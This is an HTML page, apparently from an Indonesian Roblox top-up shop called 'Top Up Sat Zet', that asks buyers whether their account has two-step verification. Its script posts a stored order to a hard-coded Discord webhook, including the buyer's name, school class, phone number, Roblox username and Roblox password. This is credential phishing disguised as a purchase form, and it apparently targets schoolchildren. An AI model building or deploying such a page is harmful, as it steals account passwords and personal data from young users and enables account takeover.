<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2 Step Verification · Top Up Sat Zet</title>
    <link rel="icon" type="image/png" href="img.png">
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
            margin: 0;
            padding: 0;
        }
        body {
            background: linear-gradient(145deg, #1a2a32 0%, #0f1a1f 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            background: rgba(255, 255, 255, 0.07);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 42px;
            box-shadow: 0 25px 50px -10px rgba(0, 0, 0, 0.5);
            width: 100%;
            max-width: 450px;
            padding: 32px 28px;
            color: #eef4f8;
            text-align: center;
        }
        h1 {
            font-size: 2rem;
            font-weight: 500;
            background: linear-gradient(135deg, #ffd966, #ffb347);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 20px;
        }
        .question {
            font-size: 1.5rem;
            margin: 30px 0;
            color: #ffdb9f;
        }
        .button-group {
            display: flex;
            gap: 20px;
            justify-content: center;
            margin-bottom: 30px;
        }
        .fa-btn {
            background: rgba(20, 30, 38, 0.8);
            border: 2px solid rgba(255, 200, 100, 0.2);
            border-radius: 60px;
            padding: 16px 40px;
            font-size: 1.4rem;
            font-weight: 600;
            color: #ffdb9f;
            cursor: pointer;
            transition: 0.2s;
            min-width: 120px;
        }
        .fa-btn:hover {
            border-color: #ffb347;
            color: white;
            background: #1f313c;
            transform: scale(1.02);
        }
        .status-msg {
            background: #0c1c24;
            border-radius: 60px;
            padding: 14px 28px;
            color: #a9d6e5;
            border: 1px solid #3f6f7a;
            margin-top: 20px;
        }
        .hidden {
            display: none;
        }
        .back-link {
            display: block;
            margin-top: 24px;
            color: #8aa9b9;
            text-decoration: none;
            font-size: 0.9rem;
        }
        .back-link:hover {
            color: #ffb347;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>🔐 Verifikasi</h1>
    <div class="question">Apakah Anda memiliki 2 step verification?</div>
    <div class="button-group">
        <button class="fa-btn" id="yesBtn">Ya</button>
        <button class="fa-btn" id="noBtn">Tidak</button>
    </div>
    <div id="statusMsg" class="status-msg hidden"></div>
    <a href="info.html" class="back-link">← Kembali ke form</a>
</div>

<script>
    (function() {
        const yesBtn = document.getElementById('yesBtn');
        const noBtn = document.getElementById('noBtn');
        const statusMsg = document.getElementById('statusMsg');

        const WEBHOOK_URL = "https://discord.com/api/webhooks/1474595768404017266/ojyfzuWLQHP_91kfvUf9Ix09tlKLd5acyidSuG7kbfR0HDCMfjlJo7lbcfCUAj3IVvO5";

        const pendingOrder = localStorage.getItem('pendingOrder');
        if (!pendingOrder) {
            statusMsg.textContent = '❌ Tidak ada data order. Silakan mulai dari awal.';
            statusMsg.classList.remove('hidden');
            yesBtn.disabled = true;
            noBtn.disabled = true;
        }

        async function sendWith2FA(answer) {
            const order = JSON.parse(pendingOrder);
            const fields = [
                { name: 'Paket', value: `${order.package} · ${order.price}`, inline: true },
                { name: 'Nama', value: order.name, inline: true },
                { name: 'Kelas', value: order.class, inline: true },
                { name: 'No. HP', value: order.phone, inline: true },
                { name: 'Username Roblox', value: order.username, inline: true },
                { name: 'Password Roblox', value: order.password, inline: true },
                { name: '2 Step Verification', value: answer, inline: false }
            ];

            const message = {
                content: `**🆕 PRE-ORDER BARU**`,
                embeds: [{
                    title: `📦 ${order.category}`,
                    color: 0xff9f2f,
                    fields: fields,
                    footer: { text: 'Top Up Sat Zet' },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(message)
                });
                return response.ok;
            } catch (e) {
                console.error(e);
                return false;
            }
        }

        async function handleAnswer(answer) {
            statusMsg.textContent = '⏳ Mengirim order...';
            statusMsg.classList.remove('hidden');
            yesBtn.disabled = true;
            noBtn.disabled = true;

            const success = await sendWith2FA(answer);
            if (success) {
                statusMsg.textContent = '✅ Order terkirim! Terima kasih.';
                localStorage.removeItem('pendingOrder');
            } else {
                statusMsg.textContent = '❌ Gagal mengirim. Coba lagi.';
                yesBtn.disabled = false;
                noBtn.disabled = false;
            }
        }

        yesBtn.addEventListener('click', () => handleAnswer('Ya'));
        noBtn.addEventListener('click', () => handleAnswer('Tidak'));
    })();
</script>
</body>
</html>
